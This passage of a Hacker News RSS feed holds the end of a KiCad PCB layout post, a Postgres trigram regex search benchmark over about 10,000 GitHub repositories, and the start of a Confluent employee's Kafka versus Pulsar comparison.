<p>The important thing is the physical form factor, which determines the footprint on the board. Once you pick a part, it has a size, and you need to tell KiCad which physical footprint should be assigned to that component. I used 0603 resistors, so I assigned each resistor in the schematic the “Resistor_SMD:R_0603_1608Metric” footprint.</p>

<p>Same for everything else. Jon showed me how to draw my own footprints, but to avoid complexity, I was able to find appropriate footprints in KiCad’s standard libraries for every component I needed.</p>

<p>When you import the schematic into Pcbnew, it’s time to figure out where things go. Where are the edges of the board? Make careful measurements here. Where do the mounting holes go? Where do you want 
the microcontroller? Where do you want the USB port?</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/dimensions.jpeg"><img src="https://chadaustin.me/images/sculpt/dimensions.jpeg" alt="Measuring dimensions and mounting holes"></a>
<figcaption>Measuring dimensions and mounting holes</figcaption>
</figure>

<p>Also, you have to pick through-hole sizes and trace widths. Jon had me use .250 mm for the narrow traces and .500 mm for the wider ones, presumably from experience. I used the narrow traces for signalling and wide traces for power, though I’ve since heard it’s a good idea to use narrow traces between filter capacitors and VBUS.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/pcb-layout.svg"><img src="https://chadaustin.me/images/sculpt/pcb-layout.svg" alt="Schematic"></a>
<figcaption>PCB layout in KiCad</figcaption>
</figure>

<p>Of course, there’s some iteration between the schematic and the PCB. After physically placing the ribbon cable connector and MCU, the traces all crossed over each other, so I had to reassign all the pins so it made sense physically.</p>

<p>There are also physical constraints about how USB data lines are run, and how the electrostatic protection chip wants to be placed for the most protection.</p>

<p>So, as simple as this board is, I spent a fair amount of time getting all of that right.</p>

<p>I found myself getting lost in the abstractness of holes and traces and footprints, so it was helpful to ground myself by occasionally loading the PCB in KiCad’s 3D viewer.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/3d-view.png"><img src="https://chadaustin.me/images/sculpt/3d-view.png" alt="Schematic"></a>
<figcaption>3D View</figcaption>
</figure>

<h2 id="designing-the-final-board---manufacturing-and-testing-physical-fit">Designing the Final Board - Manufacturing and Testing Physical Fit</h2>

<p>I tried to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chadaustin.me/2021/02/wired-sculpt/">https://chadaustin.me/2021/02/wired-sculpt/</a></em></p>]]>
            </description>
            <link>https://chadaustin.me/2021/02/wired-sculpt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26220556</guid>
            <pubDate>Mon, 22 Feb 2021 03:30:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Postgres regex search over 10k GitHub repositories (using only a MacBook)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26220446">thread link</a>) | @randomdrake
<br/>
February 21, 2021 | https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories | <a href="https://web.archive.org/web/*/https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In this article, we share empirical measurements from our experiments in using Postgres to index and search over 10,000 top GitHub repositories using <code>pg_trgm</code> on only a Macbook.</p>

<p>This is a follow up to <a href="https://devlog.hexops.com/2021/postgres-trigram-search-learnings">“Postgres Trigram search learnings”</a>, in which we shared several learnings and beliefs about trying to use Postgres Trigram indexes as an alterative to Google’s <a href="https://github.com/google/zoekt">Zoekt</a> (“Fast trigram based code search”).</p>

<p>We share our results, as well as <a href="https://github.com/hexops/pgtrgm_emperical_measurements">the exact steps we performed, scripts, and lists of the top 20,000 repositories by stars/language on GitHub</a> so you can reproduce the results yourself should you desire.</p>

<h2 id="tldr">TL;DR</h2>

<p><strong>This article is extensive and more akin to a research paper than a blog post.</strong> If you’re interested in our conclusions, see <a href="#conclusions">conclusions</a> instead.</p>

<h2 id="goals">Goals</h2>

<p>We wanted to get empirical measurements for how suitable Postgres is in providing regexp search over documents, e.g. as an alterative to Google’s <a href="https://github.com/google/zoekt">Zoekt</a> (“Fast trigram based code search”). In specific:</p>

<ul>
  <li>How many repositories can we index on just a 2019 Macbook Pro?</li>
  <li>How fast are different regexp searches over the corpus?</li>
  <li>What Postgres 13 configuration gives best results?</li>
  <li>What other operational effects need consideration if seriously attempting to use Postgres as the backend for a regexp search engine?</li>
  <li>What is the best database schema to use?</li>
</ul>

<h2 id="hardware">Hardware</h2>

<p>We ran all tests on a 2019 Macbook Pro with:</p>

<ul>
  <li>2.3 GHz 8-Core Intel Core i9</li>
  <li>16 GB 2667 MHz DDR4</li>
</ul>

<p>During test execution, few other Mac applications were in use such that effectively all CPU/memory was available to Postgres.</p>

<h2 id="corpus">Corpus</h2>

<p>We scraped <a href="https://github.com/hexops/pgtrgm_emperical_measurements/tree/main/top_repos">lists of the top 1,000 repositories from the GitHub search API</a> ranked by stars for each of the following languages (~20.5k repositories in total):</p>

<ul>
  <li>C++, C#, CSS, Go, HTML, Java, JavaScript, MatLab, ObjC, Perl, PHP, Python, Ruby, Rust, Shell, Solidity, Swift, TypeScript, VB .NET, and Zig.</li>
</ul>

<p>Cloning all ~20.5k repositories in parallel took ~14 hours with a fast ~100 Mbps connection to GitHub’s servers.</p>

<h3 id="dataset-reduction">Dataset reduction</h3>

<p>We found the amount of disk space required by <code>git clone --depth 1</code> on these repositories to be a sizable ~412G for just 12,148 repositories - and so we put in place several processes for further reduce the dataset size by about 66%:</p>

<ul>
  <li>Removing <code>.git</code> directories resulted in a 30% reduction (412G -&gt; 290G, for 12,148 repositories)</li>
  <li>Removing files &gt; 1 MiB resulted in another 51% reduction (290G -&gt; 142G, for 12,148 repositories - note GitHub does not index files &gt; 384 KiB in their search engine)</li>
</ul>

<h2 id="database-insertion">Database insertion</h2>

<p>We <a href="https://github.com/hexops/pgtrgm_emperical_measurements/blob/main/cmd/corpusindex/main.go">concurrently inserted</a> the entire corpus into Postgres, with the following DB schema:</p>

<div><div><pre><code><span>CREATE</span> <span>EXTENSION</span> <span>IF</span> <span>NOT</span> <span>EXISTS</span> <span>pg_trgm</span><span>;</span>
<span>CREATE</span> <span>TABLE</span> <span>IF</span> <span>NOT</span> <span>EXISTS</span> <span>files</span> <span>(</span>
    <span>id</span> <span>bigserial</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
    <span>contents</span> <span>text</span> <span>NOT</span> <span>NULL</span><span>,</span>
    <span>filepath</span> <span>text</span> <span>NOT</span> <span>NULL</span>
<span>);</span>
</code></pre></div></div>

<p>In total, this took around ~8 hours to complete and Postgres’s entire on-disk utilization was 101G.</p>

<h2 id="creating-the-trigram-index">Creating the Trigram index</h2>

<p>We tried three separate times to index the dataset using the following GIN Trigram index:</p>

<div><div><pre><code>CREATE INDEX IF NOT EXISTS files_contents_trgm_idx ON files USING GIN (contents gin_trgm_ops);
</code></pre></div></div>

<ul>
  <li><strong>In the first attempt, we hit an OOM after 11 hours and 34 minutes.</strong> This was due to a rapid spike in memory usage at the very end of indexing. We used a <a href="https://github.com/hexops/pgtrgm_emperical_measurements#configuration-attempt-1-indexing-failure-oom">fairly aggressive</a> Postgres configuration with a very large max WAL size, so it was not entirely unexpected.</li>
  <li><strong>In the second attempt, we ran out of SSD disk space after ~27 hours</strong>. Notable is that the disk space largely grew towards the end of indexing, similar to when we faced an OOM - it was not a gradual increase over time. For this attempt, we used the excellent <a href="https://pgtune.leopard.in.ua/#/">pgtune</a> tool to reduce our first Postgres configuration as follows:</li>
</ul>

<div><div><pre><code>shared_buffers = 4GB → 2560MB
effective_cache_size = 12GB → 7680MB
maintenance_work_mem = 16GB → 1280MB
default_statistics_target = 100 → 500
work_mem = 5242kB → 16MB
min_wal_size = 50GB → 4GB
max_wal_size = 4GB → 16GB
max_parallel_workers_per_gather = 8 → 4
max_parallel_maintenance_workers = 8 → 4
</code></pre></div></div>
<ul>
  <li><strong>In our third and final attempt, we cut the dataset in half and indexing succeeded after 22 hours.</strong> In specific, we deleted half of the files in the database (from 19,441,820 files / 178GiB of data to 9,720,910 files / 82 GiB of data.) The Postgres configuration used was the same as in attempt 2.</li>
</ul>

<h2 id="indexing-performance-memory-usage">Indexing performance: Memory usage</h2>

<p>In our first attempt, we see the reported <code>docker stats</code> memory usage of the container grow up to 12 GiB (chart shows MiB of memory used over time):</p>

<p><img width="981" alt="image" src="https://user-images.githubusercontent.com/3173176/107313722-56bbac80-6a50-11eb-94c7-8e13ea095053.png"></p>

<p>In our second and third attempts, we see far less memory usage (~1.6 GiB consistently):</p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107314104-350ef500-6a51-11eb-909f-2f1b524d29b2.png"></p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107315387-ce3f0b00-6a53-11eb-886c-410f000f73bd.png"></p>

<h2 id="indexing-performance-cpu-usage">Indexing performance: CPU usage</h2>

<p>Postgres’ Trigram indexing appears to be mostly single-threaded (at least when indexing <em>a single table</em>, we test multiple tables later.)</p>

<p>In our first attempt, CPU usage for the container did not rise above 156% (one and a half virtual CPU cores):</p>

<p><img width="982" alt="image" src="https://user-images.githubusercontent.com/3173176/107313915-cc277d00-6a50-11eb-9282-62159a127966.png"></p>

<p>Our second attempt was around 150-200% CPU usage on average:</p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107314168-507a0000-6a51-11eb-8a18-ec18752f7f16.png"></p>

<p>Our third attempt similarly saw an average of 150-200%, but with a brief spike towards the end to ~350% CPU:</p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107315239-8324f800-6a53-11eb-9a5b-fcc61d1a7b59.png"></p>

<h2 id="indexing-performance-disk-io">Indexing performance: Disk IO</h2>

<p>Disk reads/writes during indexing averaged about ~250 MB/s for reads (blue) and writes (red). Native in-software tests show the same Macbook able to achieve read/write speeds of ~860 MB/s with &lt;5% affect on CPU utilization.</p>

<p><small>Addition made Feb 20, 2021:</small> We ran tests using native Postgres as well (instead of in Docker with a bind mount) and found better indexing and query performance, more on this below.</p>

<p><img width="599" alt="image" src="https://user-images.githubusercontent.com/3173176/106507903-ec6f9e80-6488-11eb-88a8-78e5b7aacfd6.png"></p>

<h2 id="indexing-performance-disk-space">Indexing performance: Disk space</h2>

<p>The database contains 9,720,910 files totalling 82.07 GiB:</p>

<div><div><pre><code>postgres=# select count(filepath) from files;
  count  
---------
 9720910
(1 row)

postgres=# select SUM(octet_length(contents)) from files;
     sum     
-------------
 88123563320
(1 row)
</code></pre></div></div>

<p><strong>Before indexing</strong>, we find that all of Postgres is consuming 54G:</p>

<div><div><pre><code>$ du -sh .postgres/
 54G	.postgres/
</code></pre></div></div>

<p>After <code>CREATE INDEX</code>, Postgres uses:</p>

<div><div><pre><code>$ du -sh .postgres/
 73G	.postgres/
</code></pre></div></div>

<p>Thus, the index size for 82 GiB of text is 19 GiB (or 23% of the data size.)</p>

<h2 id="database-startup-times">Database startup times</h2>

<p>From an operational standpoint, it is worth noting that if Postgres is starting clean (i.e. previous shutdown was graceful) then startup time is almost instantaneous: it begins accepting connections immediately and loads the index as needed.</p>

<p>However, if Postgres experienced a non-graceful termination during e.g. startup, it can take a hefty ~10 minutes with this dataset to start as it goes through an automated recovery process.</p>

<h2 id="queries-executed">Queries executed</h2>

<p>In total, we executed 19,936 search queries against the index. We chose queries which we expect give reasonably varying amounts of coverage over the trigram index (that is, queries whose trigrams are more or less likely to occur in many files):</p>

<table>
  <thead>
    <tr>
      <th>Regexp query</th>
      <th>Matching # files in entire dataset</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>var</code></td>
      <td>unknown (2m+ suspected)</td>
    </tr>
    <tr>
      <td><code>error</code></td>
      <td>1,479,452</td>
    </tr>
    <tr>
      <td><code>123456789</code></td>
      <td>59,841</td>
    </tr>
    <tr>
      <td><code>fmt\.Error</code></td>
      <td>127,895</td>
    </tr>
    <tr>
      <td><code>fmt\.Println</code></td>
      <td>22,876</td>
    </tr>
    <tr>
      <td><code>bytes.Buffer</code></td>
      <td>34,554</td>
    </tr>
    <tr>
      <td><code>fmt\.Print.*</code></td>
      <td>37,319</td>
    </tr>
    <tr>
      <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
      <td>0</td>
    </tr>
    <tr>
      <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<details>
<summary>Detailed breakdown</summary>
<div>

    <table>
      <thead>
        <tr>
          <th>Query</th>
          <th>Result Limit</th>
          <th>Times executed</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><code>var</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>var</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>var</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>var</code></td>
          <td>unlimited</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>10</td>
          <td>2000</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>100</td>
          <td>2000</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>1000</td>
          <td>200</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>unlimited</td>
          <td>18</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>10</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>100</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>1000</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
      </tbody>
    </table>

  </div>
</details>

<h2 id="query-performance">Query performance</h2>

<p>In total, we executed 19,936 search queries against the database (linearly, not in parallel) which completed in the following times:</p>

<table>
  <thead>
    <tr>
      <th>Time bucket</th>
      <th>Percentage of queries</th>
      <th>Number of queries</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Under 50ms</td>
      <td>30%</td>
      <td>5,933</td>
    </tr>
    <tr>
      <td>Under 250ms</td>
      <td>41%</td>
      <td>8,088</td>
    </tr>
    <tr>
      <td>Under 500ms</td>
      <td>52%</td>
      <td>10,275</td>
    </tr>
    <tr>
      <td>Under 750ms</td>
      <td>63%</td>
      <td>12,473</td>
    </tr>
    <tr>
      <td>Under 1s</td>
      <td>68%</td>
      <td>13,481</td>
    </tr>
    <tr>
      <td>Under 1.5s</td>
      <td>74%</td>
      <td>14,697</td>
    </tr>
    <tr>
      <td>Under 3s</td>
      <td>79%</td>
      <td>15,706</td>
    </tr>
    <tr>
      <td>Under 25s</td>
      <td>79%</td>
      <td>15,708</td>
    </tr>
    <tr>
      <td>Under 30s</td>
      <td>99%</td>
      <td>19,788</td>
    </tr>
  </tbody>
</table>

<h2 id="query-performance-vs-planning-time">Query performance vs. planning time</h2>

<p>The following scatter plot shows how 79% of queries executed in under 3s (Y axis, in ms), while Postgres’s query planner had planned them for execution in under 100-250ms generally (X axis, in ms):</p>

<p><img width="1252" alt="image" src="https://user-images.githubusercontent.com/3173176/107848471-ef379100-6db0-11eb-8396-4d156a179aae.png"></p>

<p>If we expand the view to include all queries, we start to get a picture of just how outlier these 21% of queries are (note that the small block of dots in the bottom left represents the same diagram shown above):</p>

<p><img width="1250" alt="image" src="https://user-images.githubusercontent.com/3173176/107848517-3cb3fe00-6db1-11eb-9652-e65d7d88fe36.png"></p>

<h2 id="query-time-vs-cpu--memory-usage">Query time vs. CPU &amp; Memory usage</h2>

<p>The following image shows:</p>

<ul>
  <li>(top) Query time in milliseconds</li>
  <li>(middle) CPU usage percentage (e.g. 801% refers to 8 out of 16 virtual CPU cores being consumed)</li>
  <li>(bottom) Memory usage in MiB.</li>
</ul>

<p><img width="1255" alt="image" src="https://user-images.githubusercontent.com/3173176/107848716-efd12700-6db2-11eb-8e8b-a8141a6bdb0b.png"></p>

<p>Notable insights from this are:</p>

<ul>
  <li>The large increase in resource usage towards the end is when we began executing queries with no <code>LIMIT</code>.</li>
  <li>CPU usage does not exceed 138%, until the spike at the end.</li>
  <li>Memory usage does not exceed 42 MiB, until the spike at the end.</li>
</ul>

<p>We suspect <code>pg_trgm</code> is single-threaded within the scope of a single table, but with <a href="https://www.postgresql.org/docs/10/ddl-partitioning.html">table data partitioning</a> (or splitting data into multiple tables with subsets of the data), we suspect better parallelism could be achieved.</p>

<h2 id="investigating-slow-queries">Investigating slow queries</h2>

<p>If we plot the number of index rechecks (X axis) vs. execution time (Y axis), we can clearly see one of the most significant aspects of slow queries is that they have many more index rechecks:</p>

<p><img width="1036" alt="image" src="https://user-images.githubusercontent.com/3173176/107849660-fc0cb280-6db9-11eb-9c10-cb7e74366ab7.png"></p>

<p>And if we look at <a href="https://github.com/hexops/pgtrgm_emperical_measurements/blob/main/query_logs/query-run-3.log#L3-L24">the <code>EXPLAIN ANALYZE</code> output for one of these queries</a> we can also confirm <code>Parallel Bitmap Heap Scan</code> is slow due to <code>Rows Removed by Index Recheck</code>.</p>

<h2 id="table-splitting">Table splitting</h2>

<p>Splitting up the search index into multiple smaller tables seems like an obvious approach to getting <code>pg_trgm</code> to use multiple CPU cores. We tried this by taking the same exact data set and splitting it into 200 tables, and found …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories">https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories</a></em></p>]]>
            </description>
            <link>https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories</link>
            <guid isPermaLink="false">hacker-news-small-sites-26220446</guid>
            <pubDate>Mon, 22 Feb 2021 03:15:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is pulsar better than kafka?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26220404">thread link</a>) | @fsynced
<br/>
February 21, 2021 | https://www.kai-waehner.de/blog/2020/06/09/apache-kafka-versus-apache-pulsar-event-streaming-comparison-features-myths-explored/ | <a href="https://web.archive.org/web/*/https://www.kai-waehner.de/blog/2020/06/09/apache-kafka-versus-apache-pulsar-event-streaming-comparison-features-myths-explored/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<p><b>Pulsar vs Kafka</b> – which one is better? This blog post explores <b>pros and cons, popular myths, and non-technical criteria to find the best tool for your business problem</b>.</p>
<p>My discussions are usually around Apache Kafka and its ecosystem as I work for Confluent. <b>The only questions I got about Pulsar in the last years came from Pulsar committers and contributors</b>. They asked me deep technical questions so as to be able to explain where Kafka sucks and why Pulsar is the much better option. Discussions about this topic on platforms like Reddit are typically very opinionated, often inaccurate, and brutal. The following is my point of view based on years of experience with open source streaming platforms.</p>
<h2 id="tech-comparisons-are-the-new-black-kafka-vs-middleware-event-streaming-and-api-platforms">Tech comparisons are the new black: Kafka vs. Middleware, Event Streaming and API Platforms</h2>
<p>Tech comparisons are meant to <b>guide people to choose the right solution and architecture for their business problem</b>. There is no all-rounder, and there should be no bias. Choose the right tool for the problem.</p>
<p>However, <strong>technical comparisons are almost always biased</strong>. Even if the author does not work for a vendor and is an “independent” consultant, he or she is still likely to have a biased opinion from past experiences and knowledge, whether purposely or unknowingly. Still, comparisons from different perspectives are useful, and we’ve seen Apache Pulsar discussed in a few places on the internet, so I wanted to share my personal views of how Kafka and Pulsar compare. <strong>I work for Confluent, the leading experts behind Apache Kafka and its ecosystem</strong>, so keep that in mind, but the aim of this post is not to provide opinion, it’s to <b>weigh up facts rather than myths</b>.</p>
<p>Technical comparisons of open source frameworks and commercial software products happen all the time. I did several comparisons in the past on my blog or other platforms like InfoQ, including a <a href="https://www.kai-waehner.de/blog/2012/01/10/spoilt-for-choice-which-integration-framework-to-use-spring-integration-mule-esb-or-apache-camel/">Comparison of integration frameworks</a>, <a href="https://www.infoq.com/articles/ESB-Integration">Choosing the right ESB for your integration needs</a>, <a href="https://www.kai-waehner.de/blog/2019/03/07/apache-kafka-middleware-mq-etl-esb-comparison/">Kafka vs. ETL / ESB / MQ</a>, <a href="https://www.kai-waehner.de/blog/2020/04/24/mainframe-offloading-replacement-apache-kafka-connect-ibm-db2-mq-cdc-cobol/">Kafka vs. Mainframe</a> and <a href="https://www.kai-waehner.de/blog/2020/05/25/api-management-gateway-apache-kafka-comparison-mulesoft-kong-apigee/">Apache Kafka and API Management / API Gateway</a>. All these comparisons were done because customers wanted to understand when to use which tool.</p>
<p>For Pulsar vs. Kafka, the situation is a little bit different.</p>
<h2 id="why-compare-pulsar-and-kafka">Why compare Pulsar and Kafka?</h2>
<p><b>Talking to prospects or customers, I rarely get asked about Pulsar.</b> To be fair, this increased slightly in the last months. I guess the question comes up in every ~15th or ~20th meeting due to the overlapping feature set and use cases. However, this seems to be mostly due to a few posts on the internet that claim Pulsar is in some ways better than Kafka. There is no fact-checking and very little material, if any, for the opposing view.</p>
<p><b>I have not talked to a single organization that seriously considered deploying Pulsar in production, </b>although I know there are a large number of users out there in the world who need a distributed messaging technology like Kafka or Pulsar. But I also think that Pulsar’s alleged reference users are not particularly accurate.</p>
<p>For example, their flagship user is Tencent, a large Chinese tech company, but Tencent is a huge Kafka user, whereas Pulsar’s use is limited to just one project. <strong>Tencent processes trillion messages per day (in digits: 10,000,000,000,000) with Kafka</strong>. As it turns out, <strong>Tencent uses Kafka 1000x more than Pulsar </strong>(ten trillion msg/day vs. tens of billion msg/day)<strong>.</strong> The Tencent team discussed their Kafka deployment in more detail: <a href="https://www.confluent.io/blog/tencent-kafka-process-10-trillion-messages-per-day/" target="_blank" rel="noopener noreferrer">How Tencent PCG Uses Apache Kafka to Handle 10 Trillion+ Messages Per Day</a>.</p>
<h4 id="comparison-of-two-competitive-open-source-frameworks">Comparison of two competitive open source frameworks</h4>
<p><b>Apache Kafka and Apache Pulsar are two exciting and competing technologies</b>. Therefore, it makes a lot of sense to compare them. Period.</p>
<p><strong>Both Apache Kafka and Apache Pulsar have very similar feature sets</strong>. I recommend that you evaluate both frameworks for available features, maturity, market adoption, open source tools and projects, training material, availability of local meetups, videos, blog posts, etc. Reference use cases from your industry or business problems help making the right decision.</p>
<p>Confluent published such a comparison of “<a href="https://www.confluent.io/kafka-vs-pulsar/">Kafka vs. Pulsar vs. RabbitMQ: Performance, Architecture, and Features Compared</a>“. I was involved in creating this comparison. So we have that comparison already…</p>
<p>What is this blog post here about then?</p>
<p>I want to <b>explore the myths from some ‘Kafka vs. Pulsar’ arguments</b> which I see regularly in blog posts and forum discussions. Afterwards, I will give a more <b>comprehensive comparison beyond just technical aspects</b> because most Pulsar discussions focus purely on tech features.</p>
<p><img src="https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison.jpg" data-src="https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison.jpg" alt="Apache Kafka vs Apache Pulsar Comparison and Myths Explored" width="760" height="572" data-srcset="https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison.jpg 760w, https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison-300x225.jpg 300w, https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison-200x150.jpg 200w, https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison-380x286.jpg 380w" data-sizes="(max-width: 760px) 100vw, 760px" srcset="https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison.jpg 760w, https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison-300x225.jpg 300w, https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison-200x150.jpg 200w, https://www.kai-waehner.de/wp-content/uploads/2020/05/Apache-Kafka-vs-Apache-Pulsar-Comparison-380x286.jpg 380w"></p>
<h2 id="kafka-vs-pulsar-technology-myths-explored">Kafka vs Pulsar – Technology myths explored<b><br>
</b></h2>
<p><b>The following discusses some myths I have come across. I agree with some of them, but also counter some others with hard facts</b>. Of course, different opinions can exist for some of these statements. Again, this is totally fine. The following is my point of view.</p>
<h3 id="myth-1-pulsar-has-differentiating-built-in-features-compared-to-kafka">Myth 1: “Pulsar has differentiating built-in features compared to Kafka”?</h3>
<p><b>True.</b></p>
<p>If you compare Apache Kafka to Apache Pulsar, features like its tiered architecture, queuing, and multi-tenancy are mentioned as differentiators.</p>
<p><b>But:</b></p>
<p>Kafka has many differentiating features, too:</p>
<ul>
<li>Half as many servers to run</li>
<li>Data saved to disk only once</li>
<li>Data cached in memory only once</li>
<li>Battle-tested replication protocol</li>
<li>Zero copy performance</li>
<li>Transactions</li>
<li>Built-in stream processing</li>
<li>Long term storage</li>
<li>In the works: ZooKeeper removal (<a href="https://cwiki.apache.org/confluence/display/KAFKA/KIP-500%3A+Replace+ZooKeeper+with+a+Self-Managed+Metadata+Quorum">KIP-500</a>), which makes Kafka even more simple to operate and deploy than Pulsar (which has a four-component architecture of Pulsar, ZooKeeper, BookKeeper, and RocksDB), apart from making Kafka more scalable, more resilient, etc. etc..)</li>
<li>In the works: Tiered Storage (<a href="https://cwiki.apache.org/confluence/display/KAFKA/KIP-405%3A+Kafka+Tiered+Storage">KIP-405</a>), which makes Kafka more elastic and cost-efficient.</li>
</ul>
<p>Also ask yourself: Should you really compare just the open source frameworks or products and vendors with their complete offering?</p>
<p>It is <b>easy to add new features if you don’t have to provide mission-critical support for it</b>. Don’t just evaluate features in a checklist, but also evaluate how they are battle-tested in production scenarios. <b>How many “differentiating features” are low-quality and implemented quickly vs. high-quality implementations?</b></p>
<p>For instance: <b>It took a few years to implement and battle-test Kafka Streams as Kafka-native stream processing engine. Do you really want to compare this to Pulsar Functions?</b> The latter is a feature to add user-defined functions (UDF); without any relation to “real stream processing”. Or is this more like Single Message Transformations (SMT), a core feature of Kafka Connect? Just be sure to a) compare apples to apples (instead of apples to oranges) and b) don’t forget to think about the maturity of a feature. The more powerful and critical, the more mature it should be…</p>
<p>The Kafka community spends a large amount of efforts to improve the core project and its ecosystem. <b>Confluent alone has over 200 full time engineers</b> working on the Kafka project, additional community components, commercial products and the SaaS offering on major cloud providers.</p>
<h3 id="myth-2-pulsar-has-a-few-very-big-users-like-tencent-in-china">Myth 2: “Pulsar has a few very big users like Tencent in China”?</h3>
<p><b>True.</b></p>
<p><b>But: Tencent actually uses Kafka more than Pulsar</b>. The billing department, which uses Pulsar, is only a small fraction at Tencent, whereas a large portion of the core business is using Kafka, and they have a Global-Kafka like architecture that combines 1000+ brokers into a single logical cluster.</p>
<p>Always be cautious with open source projects. Check out the success at “normal companies”. Just because a tech giant uses it, does not mean it will work for your company well. How many Fortune 2000 companies shared their success stories around Pulsar in the past?</p>
